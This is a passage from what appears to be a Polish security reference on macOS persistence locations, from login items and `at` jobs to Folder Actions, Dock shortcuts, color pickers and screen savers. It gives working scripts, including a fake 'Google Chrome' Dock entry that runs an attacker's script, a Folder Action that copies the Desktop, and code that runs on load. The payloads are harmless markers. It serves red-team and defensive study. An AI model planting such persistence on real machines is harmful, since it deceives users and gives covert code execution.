W **Ustawieniach systemowych → Ogólne → Elementy logowania i rozszerzenia** użytkownicy mogą przeglądać elementy logowania i elementy działające w tle. macOS 13 i nowsze wersje udostępniają [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) do rejestrowania dołączonych do aplikacji elementów logowania, launch agentów i launch daemonów. Zachowanie metody [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) zależy od typu elementu i stanu zatwierdzenia. **Samo umieszczenie aplikacji pomocniczej w pakiecie aplikacji nie wystarczy, aby zarejestrować nowy element logowania.** Z kolei jeśli zarejestrowany już plik wykonywalny aplikacji pomocniczej jest zapisywalny, jego modyfikacja może wpłynąć na kolejne uruchomienie bez ponownej rejestracji; najpierw sprawdź rzeczywistą ścieżkę i weryfikację podpisu kodu.

Poniższy sposób pozwala wyszukać dołączone do aplikacji pliki pomocnicze na Macu w trybie tylko do odczytu; nie rejestruje ani nie uruchamia żadnego z nich:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

W przypadku dołączonego pliku launch plist rozwiąż `BundleProgram` względem katalogu głównego pakietu aplikacji (na przykład `Contents/MacOS/Helper`), zgodnie z [wytycznymi Apple dotyczącymi migracji Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Inwentaryzacja katalogu `/Applications` w trybie tylko do odczytu na Macu badawczym wykazała 14 dołączonych wpisów helperów i pięć deklaracji `BundleProgram`; wszystkie pięć wskazywało na istniejące cele, a dwa przeszły kontrolę możliwości zapisu przez użytkownika. Kontrola ta **nie** potwierdza, że którykolwiek z helperów jest zarejestrowany, włączony, wykonywalny po weryfikacji podpisu ani dostępny z poziomu sandboxa. Polecenie `sfltool dumpbtm` wyświetliło na tym Macu 150 nazwanych rekordów; jest to narzędzie do inspekcji, a nie test potwierdzający, że każdy rekord jest aktywny.

Starsze elementy logowania można również obsługiwać za pomocą Apple events. Można je wyświetlać, dodawać i usuwać z wiersza poleceń, choć ich dodanie zmienia trwałą konfigurację logowania użytkownika i może wymagać zgody na Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` to szczegół implementacyjny, a nie obsługiwane miejsce do instalowania payloadu przez samo zapisanie pliku. Starsze API `SMLoginItemSetEnabled` zostało zastąpione w przypadku nowych helperów przez `SMAppService`; ścieżka `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, podana wcześniej na tej stronie, nie istniała na testowej maszynie z macOS 26.5.2. Oceniając współczesne elementy logowania, korzystaj z API rejestracji i stanu interfejsu systemowego, zamiast zakładać istnienie określonej ścieżki do bazy danych.

### ZIP jako element logowania

(Sprawdź poprzednią sekcję o elementach logowania — to jej rozszerzenie)

Jeśli zapiszesz plik **ZIP** jako **element logowania**, otworzy go **`Archive Utility`**. Jeśli ZIP był na przykład zapisany w `~/Library` i zawierał folder **`LaunchAgents/file.plist`** z backdoorem, folder ten zostanie utworzony (domyślnie go nie ma), a plik plist zostanie dodany. Dzięki temu przy następnym logowaniu użytkownika zostanie **uruchomiony backdoor wskazany w pliku plist**.

Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu HOME użytkownika. Dzięki temu technika zadziałałaby również wtedy, gdy folder LaunchAgents już istnieje.

### At

Opis: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak **uruchomić** **`at`**, a ta funkcja musi być **włączona**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz **uruchomić** **`at`**, a ta funkcja musi być **włączona**

#### **Opis**

Zadania `at` służą do **planowania jednorazowych zadań**, które mają zostać uruchomione o określonych porach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Należy pamiętać, że zadania te są zachowywane po ponownym uruchomieniu systemu, co w określonych warunkach może stanowić zagrożenie dla bezpieczeństwa.<sup>[[16]](#references)</sup>

Dołączony plik `com.apple.atrun.plist` ma ustawienie `Disabled = true`, ale launchd przechowuje efektywne nadpisania stanu włączenia i wyłączenia osobno. Na testowej maszynie z macOS 26.5.2 polecenie `launchctl print-disabled system` wykazało, że `com.apple.atrun` jest **włączony**, mimo tego klucza w dołączonym pliku. Przed stwierdzeniem, że zadania `at` będą uruchamiane, sprawdź ich efektywny stan:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Administrator może włączyć wyłączoną usługę `atrun` za pomocą `launchctl`; poniższy historyczny przykład zmienia stan usługi systemowej i **nie został uruchomiony na Macu badawczym**:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Spowoduje to utworzenie pliku za 1 godzinę:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Sprawdź kolejkę zadań za pomocą `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Powyżej widzimy dwa zaplanowane zadania. Szczegóły zadania możemy wyświetlić za pomocą `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.

**Pliki zadań** znajdują się w `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Nazwa pliku zawiera kolejkę, numer zadania i czas, na który zaplanowano jego uruchomienie. Przyjrzyjmy się na przykład `a0001a019bdcd2`.

- `a` — kolejka
- `0001a` — numer zadania w systemie szesnastkowym, `0x1a = 26`
- `019bdcd2` — czas w systemie szesnastkowym. Oznacza liczbę minut, które upłynęły od epoki Unix. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Po pomnożeniu przez 60 otrzymujemy `1619509560`, czyli `GMT: wtorek, 27 kwietnia 2021, 7:46:00`.

Po wyświetleniu pliku zadania okazuje się, że zawiera te same informacje, które uzyskaliśmy za pomocą `at -c`.

### Alerty Kalendarza otwierające pliki

- **Cel zapisu:** wykonywalny pakiet aplikacji lub inny plik **już wybrany** przez niestandardowy alert wydarzenia Kalendarza typu **Open file**. Utworzenie lub edycja samego alertu wymaga dostępu do wydarzenia w Kalendarzu lub zaakceptowanego źródła danych kalendarza; zapis dowolnego pliku nie tworzy alertu.
- **Wyzwalacz:** zaplanowana godzina alertu na Macu, na którym Kalendarz przetwarza wydarzenie. Powtarzające się wydarzenie może ponawiać tę czynność. [Aktualny przewodnik Kalendarza Apple](https://support.apple.com/guide/calendar/icl1012/mac) potwierdza opcję alertu **Custom → Open file** w macOS 26.
- **Tożsamość wykonania i ograniczenia:** Kalendarz otwiera wybrany plik dla zalogowanego użytkownika za pomocą powiązanej z nim aplikacji. Uruchomienie pakietu aplikacji może wykonać jego kod jako ten użytkownik, z zastrzeżeniem kontroli Gatekeeper, kwarantanny i innych mechanizmów macOS. Zwykły plik skryptu może jedynie otworzyć się w edytorze; samo rozszerzenie nie dowodzi, że kod zostanie wykonany.

Aby bezpiecznie ocenić potencjalny cel, sprawdź alert wydarzenia w Kalendarzu oraz uprawnienia wybranego pliku. Tę ścieżkę opisano na podstawie przewodnika Apple i **nie testowano** jej na Macu badawczym, ponieważ test wymagałby zmodyfikowania aktywnego kalendarza i oczekiwania na wydarzenie na pulpicie. Na koncie tymczasowym można wybrać pakiet aplikacji zawierający wyłącznie znacznik, ustawić alert Open file na bliską przyszłość, potwierdzić uruchomienie, a następnie usunąć wydarzenie i aplikację.

### Automatyzacje Shortcuts w macOS

- **Cel zapisu:** plik wykonywalny **już wskazany** przez akcję skrótu albo istniejący skrót, który upoważniony użytkownik może edytować. Losowy plik `.shortcut` ani zapis do nieudokumentowanej bazy danych Shortcuts nie są obsługiwanymi metodami rejestrowania automatyzacji.
- **Wyzwalacz i tożsamość:** wcześniej skonfigurowane, włączone zdarzenie automatyzacji, takie jak pora dnia lub zdarzenie aplikacji, uruchamia skrót dla zalogowanego użytkownika. [Aktualny przewodnik Apple dotyczący automatyzacji na Macu](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) wymienia obsługiwane zdarzenia, wyjaśnia, kiedy automatyzacja może działać bez pytania, i opisuje usuwanie wyzwalacza. [Przewodnik Apple dotyczący prywatności Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) wymaga włączenia opcji **Allow Running Scripts** dla akcji skryptowych, a poszczególne akcje nadal mogą żądać uprawnień.

To warunkowa ścieżka od zapisu do wykonania, **wyłącznie wtedy, gdy istniejąca akcja ładuje zapisywalny cel**. Utworzenia nowej automatyzacji przez interfejs użytkownika nie próbowano na Macu badawczym, ponieważ zmienia to aktywne ustawienia. Na koncie tymczasowym właściciel może skonfigurować skrót uruchamiany o określonej porze, którego skrypt tworzy znacznik `/tmp/ht-shortcuts-marker`, włączyć wymagane uprawnienia, sprawdzić znacznik po wystąpieniu zdarzenia, a następnie usunąć automatyzację, skrót i znacznik.

### Akcje Automator i Quick Actions

- **Cele zapisu:** `~/Library/Automator/*.action` (użytkownik) i `/Library/Automator/*.action` (administrator) dla pakietów akcji. Zapisany przepływ pracy Quick Action zwykle znajduje się w `~/Library/Services/*.workflow`; sprawdź rzeczywistą ścieżkę przepływu wybraną przez użytkownika. [Dokumentacja frameworka Automator firmy Apple](https://developer.apple.com/documentation/automator) wymienia katalogi wyszukiwania akcji.
- **Wyzwalacz:** Automator ładuje dostępne pakiety akcji podczas uruchamiania, ale zadanie akcji jest wykonywane, gdy uruchomiony zostanie przepływ pracy, który z niej korzysta. Quick Action uruchamia się, gdy użytkownik wybierze ją w Finderze, Services lub innym udostępnionym menu. Przepływ pracy Folder Action uruchamia się po dodaniu elementów do **już przypisanego** folderu, a przepływ pracy Calendar Alarm — w chwili zdarzenia. [Typy przepływów pracy Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) opisują te zdarzenia. Sam zapis akcji lub przepływu pracy nie przypisuje folderu ani nie planuje wydarzenia w kalendarzu.
- **Tożsamość wykonania i ograniczenia:** konto, na którym działa przepływ pracy; Automator lub aplikacja wywołująca musi załadować akcję, a aktualne kontrole podpisu kodu i prywatności muszą na to pozwalać. Zapisywalny pakiet akcji, do którego odwołuje się już aktywny przepływ pracy, to inny przypadek niż instalacja nowej akcji i oczekiwanie na jej wybór.

Katalogi użytkownika `Automator` i `Services` znajdowały się na testowym Macu z macOS 26.5.2; katalog `/Library/Automator` nie istniał. Nie utworzono, nie przypisano ani nie uruchomiono żadnego aktywnego przepływu pracy. Użyj konta tymczasowego i akcji/przepływu pracy zawierających wyłącznie znacznik, aby potwierdzić konkretną ścieżkę ładowania. Osobna sekcja [Folder Actions](#folder-actions) omawia dokładniej to źródło zdarzeń.

### Folder Actions

Opis: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Opis: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Przydatne do omijania sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak móc wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`** i skonfigurować Folder Actions
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Ma podstawowe uprawnienia TCC, takie jak dostęp do Desktop, Documents i Downloads

#### Lokalizacja

- **`/Library/Scripts/Folder Action Scripts`**
  - Wymagane uprawnienia roota
  - **Wyzwalacz**: dostęp do określonego folderu
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Wyzwalacz**: dostęp do określonego folderu

#### Opis i wykorzystanie

Folder Actions to skrypty uruchamiane automatycznie po zmianach w folderze, takich jak dodanie lub usunięcie elementów, a także po innych czynnościach, na przykład otwarciu okna folderu lub zmianie jego rozmiaru. Można ich używać do różnych zadań i uruchamiać na różne sposoby, na przykład za pomocą interfejsu Findera lub poleceń terminala.<sup>[[17]](#references)[[18]](#references)</sup>

Aby skonfigurować Folder Actions, można:

1. Utworzyć przepływ pracy Folder Action za pomocą [Automator](https://support.apple.com/guide/automator/welcome/mac) i zainstalować go jako usługę.
2. Ręcznie przypisać skrypt za pomocą Folder Actions Setup dostępnego w menu kontekstowym folderu.
3. Użyć OSAScript do wysyłania komunikatów Apple Event do `System Events.app`, aby programowo skonfigurować Folder Action.
   - Ta metoda jest szczególnie przydatna do wbudowania akcji w system, co zapewnia pewien poziom trwałości.

Poniższy skrypt jest przykładem kodu, który może zostać wykonany przez Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Aby powyższy skrypt można było używać z Folder Actions, skompiluj go za pomocą:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Po skompilowaniu skryptu skonfiguruj Folder Actions, wykonując poniższy skrypt. Włączy on Folder Actions globalnie i przypisze wcześniej skompilowany skrypt do folderu Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Uruchom skrypt konfiguracyjny za pomocą:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Oto sposób implementacji tej persistence za pomocą GUI:

To skrypt, który zostanie wykonany:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Skompiluj za pomocą: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś go do:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz monitorować**, a potem w swoim przypadku wybierz **`folder.scpt`** (w moim przypadku nazwałem go `output2.scp`):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, gdy otworzysz ten folder w **Finderze**, skrypt zostanie wykonany.

Ta konfiguracja była przechowywana w formacie base64 w pliku **plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Spróbujmy teraz przygotować tę persystencję bez dostępu do GUI:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby utworzyć jego kopię zapasową:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** właśnie skonfigurowane Folder Actions:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Teraz, gdy mamy czyste środowisko:

3. Skopiuj plik kopii zapasowej: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz aplikację Folder Actions Setup.app, aby wczytać tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> U mnie to nie zadziałało, ale takie instrukcje podano w writeupie:(

### Skróty Docka

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak mieć zainstalowaną złośliwą aplikację w systemie
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `~/Library/Preferences/com.apple.dock.plist`
  - **Wyzwalacz**: kliknięcie aplikacji w Docku przez użytkownika

#### Opis i wykorzystanie

Wszystkie aplikacje widoczne w Docku są określone w pliku plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Możliwe jest **dodanie aplikacji** za pomocą:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Korzystając z **social engineering**, możesz podszyć się na przykład pod Google Chrome w Docku i faktycznie uruchomić własny skrypt:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Metody wprowadzania

- **Cel zapisu:** Pakiet aplikacji metody wprowadzania zawierający kod, zainstalowany w `~/Library/Input Methods/` (użytkownik) lub `/Library/Input Methods/` (administrator). Różni się to od zwykłych tekstowych plików mapowania klawiatury Apple `.inputplugin`, które same w sobie nie są payloadem z dowolnym kodem.
- **Wyzwalacz:** Użytkownik dodaje/włącza źródło wprowadzania w **Ustawienia systemowe → Klawiatura → Wprowadzanie tekstu**, a następnie je wybiera lub używa. Samo skopiowanie pakietu do katalogu nie dowodzi, że macOS go uruchomi. [Aktualny przewodnik Apple po źródłach wprowadzania](https://support.apple.com/guide/mac-help/mchl84525d76/mac) opisuje włączanie i przełączanie źródeł; [dokumentacja Apple InputMethodKit](https://developer.apple.com/documentation/inputmethodkit) dotyczy metod wprowadzania zawierających kod.
- **Tożsamość wykonania i zabezpieczenia:** Metoda działa w kontekście zalogowanego użytkownika, z uwzględnieniem rejestracji metod wprowadzania, podpisywania kodu i aktualnych kontroli bezpieczeństwa macOS. Istniejące włączone metody z zapisywalnym plikiem wykonywalnym wymagają osobnej analizy ścieżki i podpisu.

W starszej [notatce Apple o metodach wprowadzania firm trzecich](https://developer.apple.com/library/archive/qa/qa1810/_index.html) ostrzegano już, że skopiowanie niektórych metod palet do tych katalogów nie sprawi nawet, że pojawią się w źródłach wprowadzania. Na Macu badawczym z macOS 26.5.2 katalog użytkownika istnieje, ale nie zainstalowano ani nie aktywowano żadnego pakietu, więc jest to udokumentowana ścieżka warunkowa, a nie lokalny wynik wykonania.

### Selektory kolorów

Opis: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Musi nastąpić bardzo konkretne działanie
  - Trafisz do innego sandboxa
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/Library/ColorPickers`
  - Wymagane uprawnienia roota
  - Wyzwalacz: użycie selektora kolorów
- `~/Library/ColorPickers`
  - Wyzwalacz: użycie selektora kolorów

#### Opis i exploit

**Skompiluj** pakiet selektora kolorów zawierający Twój kod (możesz użyć na przykład [**tego**](https://github.com/viktorstrate/color-picker-plus)), dodaj konstruktor (jak w sekcji [Wygaszacze ekranu](macos-auto-start-locations.md#screen-saver)) i skopiuj pakiet do `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Następnie, gdy selektor kolorów zostanie wywołany, Twój pakiet również powinien się wykonać.

To zależy od tego, czy zgodna aplikacja otworzy systemowy panel kolorów i wybierze zainstalowany selektor. [Przewodnik Apple po panelu kolorów](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) opisuje starsze lokalizacje pakietów. Lokalna kontrola ścieżki wykazała obecność starszej usługi XPC selektora kolorów, ale na Macu badawczym nie zainstalowano ani nie załadowano żadnego selektora; nie należy wnioskować o ominięciu TCC wyłącznie na podstawie ścieżki.

Pamiętaj, że plik binarny ładujący Twoją bibliotekę działa w **bardzo restrykcyjnym sandboxie**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Wtyczki Finder Sync

**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Przydatne do ominięcia sandbox: **Nie, ponieważ trzeba uruchomić własną aplikację**
- Ominięcie TCC: Zależy od sandboxa i uprawnień włączonego rozszerzenia; nie ustalono ogólnej metody obejścia.

#### Lokalizacja

- Konkretna aplikacja

#### Opis i wykorzystanie

Przykład aplikacji z rozszerzeniem Finder Sync [**znajdziesz tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą zawierać `Finder Sync Extensions`. Takie rozszerzenie znajduje się wewnątrz aplikacji, która zostanie uruchomiona. Ponadto, aby rozszerzenie mogło wykonywać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi działać w **sandboxie** (choć można dodać łagodniejsze wyjątki) i musi zostać zarejestrowane za pomocą czegoś takiego jak:<sup>[[21]](#references)[[22]](#references)</sup>

Zainstalowane rozszerzenie musi również zostać **włączone** i wywołane dla odpowiedniej lokalizacji lub elementu w Finderze; samo zapisanie dowolnego pakietu `.appex` nie wystarczy. [API Finder Sync firmy Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) udostępnia stan włączenia. Poniższe polecenia `pluginkit` pokazują jawne rejestrowanie i włączanie, a nie automatyczne uruchamianie wyłącznie na podstawie pliku. Tę metodę zweryfikowano na podstawie dokumentacji, nie instalując ani nie włączając nowego rozszerzenia na badanym Macu.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Wygaszacz ekranu

Opis: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Opis: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Trafisz jednak do standardowego sandboxa aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `/System/Library/Screen Savers`
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Wybierz wygaszacz ekranu
- `/Library/Screen Savers`
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Wybierz wygaszacz ekranu
- `~/Library/Screen Savers`
  - **Wyzwalacz**: Wybierz wygaszacz ekranu

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i exploit

Utwórz nowy projekt w Xcode i wybierz szablon generujący nowy **wygaszacz ekranu**. Następnie dodaj do niego swój kod, na przykład poniższy kod generujący logi.<sup>[[23]](#references)[[24]](#references)</sup>

**Zbuduj** projekt i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i po kliknięciu go powinno pojawić się wiele logów:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Pamiętaj, że ponieważ w uprawnieniach binarnego pliku ładującego ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) znajduje się **`com.apple.security.app-sandbox`**, będziesz **w typowym sandboxie aplikacji**.

Kod wygaszacza:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

opis: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Przydatne do ominięcia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Skończysz jednak w sandbox aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox wydaje się bardzo ograniczony

#### Lokalizacja

- `~/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
- `/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagany root
- `/System/Library/Spotlight/`
